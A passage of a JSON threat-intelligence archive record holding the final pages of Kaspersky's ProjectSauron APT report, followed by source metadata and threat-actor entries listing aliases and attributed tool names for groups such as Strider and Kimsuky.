showed what makes them vulnerable to potential exposure and ProjectSauron did\nits best to address these issues:\n\n#####  Vulnerable or persistent C2 locations\n\n  ISP, IP, domains, and tool reuse across different campaigns\n\n  Crypto-algorithms reuse (as well as encryption keys)\n\n  Forensic evidence on disk\n\n  Timestamps in various components\n\n  Large volumes of network data or unusual protocols or message formats\n\nIn addition, it appears that the attackers took special care with what we consider as indicators of compromise\nand implemented a unique pattern for each and every target they attacked, so that the same indicators\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 21 of 22\n\n\n-----\n\nwould have little value for anyone else. This is a summary of the ProjectSauron strategy as we see it. The\nattackers clearly understand that we as researchers are always looking for patterns. Remove the patterns\nand the operation will be harder to discover. We are aware of more than 30 organisations attacked but we\nare sure that this is just a tiny tip of the iceberg.\n\nA common organisation hit by a serious actor such as ProjectSauron can hardly cope with proper detection\nand mitigation of such a threat on its own. As attackers become seasoned and more mature, the defending\nside will have to build an identical mindset: developing the highest technical skills comparable to those of the\nattackers in order to resist their onslaught.\n\n[For any inquiries contact intelreports@kaspersky com](mailto:intelreports@kaspersky.com) Page 22 of 22\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2016/2016.08.08.ProjectSauron/The-ProjectSauron-APT_research_KL.pdf"
    ],
    "report_names": [
        "The-ProjectSauron-APT_research_KL"
    ],
    "threat_actors": [
        {
            "id": "a0d369c1-f0b7-4c70-a3a5-77aabbd17979",
            "created_at": "2022-10-25T15:50:23.311311Z",
            "updated_at": "2025-03-27T02:00:55.438117Z",
            "deleted_at": null,
            "main_name": "Strider",
            "aliases": [
                "ProjectSauron"
            ],
            "source_name": "MITRE:Strider",
            "tools": [
                "Remsec"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c92de6de-9538-43e5-9190-9da092194884",
            "created_at": "2022-10-25T16:07:23.411024Z",
            "updated_at": "2025-03-27T02:02:09.785868Z",
            "deleted_at": null,
            "main_name": "Blue Termite",
            "aliases": [
                "Blue Termite",
                "Cloudy Omega"
            ],
            "source_name": "ETDA:Blue Termite",
            "tools": [
                "Emdivi",
                "Newsripper"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "99845f58-2c39-46f7-8369-bb621ebb7002",
            "created_at": "2022-10-25T16:07:24.238844Z",
            "updated_at": "2025-03-27T02:02:10.14785Z",
            "deleted_at": null,
            "main_name": "Strider",
            "aliases": [
                "ProjectSauron"
            ],
            "source_name": "ETDA:Strider",
            "tools": [
                "Backdoor.Remsec",
                "ProjectSauron",
                "Remsec"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "c1ac2a5e-0225-47a4-8ac5-5fa898c96bde",
            "created_at": "2023-01-06T13:46:38.472883Z",
            "updated_at": "2025-03-27T02:00:02.84253Z",
            "deleted_at": null,
            "main_name": "ProjectSauron",
            "aliases": [
                "Sauron",
                "Project Sauron",
                "G0041"
            ],
            "source_name": "MISPGALAXY:ProjectSauron",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "48782737-377b-47b4-aff0-87424208a643",
            "created_at": "2023-01-06T13:46:38.569144Z",
            "updated_at": "2025-03-27T02:00:02.863397Z",
            "deleted_at": null,
            "main_name": "Blue Termite",
            "aliases": [
                "Cloudy Omega",
                "Emdivi"
            ],
            "source_name": "MISPGALAXY:Blue Termite",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc78f675-b309-431d-8160-b8dcff037d4f",
            "created_at": "2024-05-01T02:03:08.142224Z",
            "updated_at": "2025-03-27T02:05:17.417972Z",
            "deleted_at": null,
            "main_name": "NICKEL KIMBALL",
            "aliases": [
                "Black Banshee ",
                "Crooked Pisces ",
                "Emerald Sleet ",
                "Kimsuky ",
                "Opal Sleet ",
                "SharpTongue ",
                "TA427 ",
                "THALLIUM ",
                "Velvet Chollima ",
                "APT43 "
            ],
            "source_name": "Secureworks:NICKEL KIMBALL",
            "tools": [
                " KONNI",
                " KimJongRAT",
                " Kimsuky",
                "BabyShark"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "760f2827-1718-4eed-8234-4027c1346145",
            "created_at": "2023-01-06T13:46:38.670947Z",
            "updated_at": "2025-03-27T02:00:02.888195Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Thallium",
                "G0086",
                "APT43",
                "Springtail",
                "Sparkling Pisces",
                "Velvet Chollima",
                "Black Banshee",
                "Operation Stolen Pencil",
                "Emerald Sleet",
                "THALLIUM"
            ],
            "source_name": "MISPGALAXY:Kimsuky",
            "tools": [
                "RevClient",
                "xrat",
                "QUASARRAT",
                "RDP Wrapper",
                "TightVNC",
                "BabyShark"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "191d7f9a-8c3c-442a-9f13-debe259d4cc2",
            "created_at": "2022-10-25T15:50:23.280374Z",
            "updated_at": "2025-03-27T02:00:55.423485Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "Kimsuky",
                "Black Banshee",
                "Velvet Chollima",
                "Emerald Sleet",
                "THALLIUM",
                "APT43",
                "TA427"
            ],
            "source_name": "MITRE:Kimsuky",
            "tools": [
                "schtasks",
                "Amadey",
                "Brave Prince",
                "CSPY Downloader",
                "gh0st RAT",
                "AppleSeed",
                "NOKKI",
                "QuasarRAT",
                "Gold Dragon",
                "PsExec",
                "KGH_SPY",
                "Mimikatz",
                "BabyShark"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "71a1e16c-3ba6-4193-be62-be53527817bc",
            "created_at": "2022-10-25T16:07:23.753455Z",
            "updated_at": "2025-03-27T02:02:09.963016Z",
            "deleted_at": null,
            "main_name": "Kimsuky",
            "aliases": [
                "APT 43",
                "Black Banshee",
                "Emerald Sleet",
                "ITG16",
                "KTA082",
                "Kimsuky",
                "Larva-24005",
                "Operation Baby Coin",
                "Operation Covert Stalker",
                "Operation DEEP#DRIVE",
                "Operation DEEP#GOSU",
                "Operation Kabar Cobra",
                "Operation Mystery Baby",
                "Operation Red Salt",
                "Operation Smoke Screen",
                "Operation Stealth Power",
                "Operation Stolen Pencil",
                "SharpTongue",
                "Sparkling Pisces",
                "Springtail",
                "TA406",
                "TA427",
                "Thallium",
                "UAT-5394",
                "Velvet Chollima"
            ],
            "source_name": "ETDA:Kimsuky",
            "tools": [
                "AngryRebel",
                "AppleSeed",
                "BITTERSWEET",
                "BabyShark",
                "BoBoStealer",
                "CSPY Downloader",
                "Farfli",
                "FlowerPower",
                "Gh0st RAT",
                "Ghost RAT",
                "Gold Dragon",
                "GoldDragon",
                "GoldStamp",
                "JamBog",
                "KGH Spyware Suite",
                "KGH_SPY",
                "KPortScan",
                "KimJongRAT",
                "Kimsuky",
                "LATEOP",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Lovexxx",
                "MailPassView",
                "Mechanical",
                "Mimikatz",
                "MoonPeak",
                "Moudour",
                "MyDogs",
                "Mydoor",
                "Network Password Recovery",
                "PCRat",
                "ProcDump",
                "PsExec",
                "ReconShark",
                "Remote Desktop PassView",
                "SHARPEXT",
                "SWEETDROP",
                "SmallTiger",
                "SniffPass",
                "TODDLERSHARK",
                "TRANSLATEXT",
                "Troll Stealer",
                "TrollAgent",
                "VENOMBITE",
                "WebBrowserPassView",
                "xRAT"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716493,
    "ts_updated_at": 1743041815,
    "ts_creation_date": 1470686818,
    "ts_modification_date": 1470686818,
    "files": {
        "pdf": "https://archive.orkl.eu/a510a638576efbbd0eb7b5fa7dbce838ddde290b.pdf",
        "text": "https://archive.orkl.eu/a510a638576efbbd0eb7b5fa7dbce838ddde290b.txt",
        "img": "https://archive.orkl.eu/a510a638576efbbd0eb7b5fa7dbce838ddde290b.jpg"
    }
}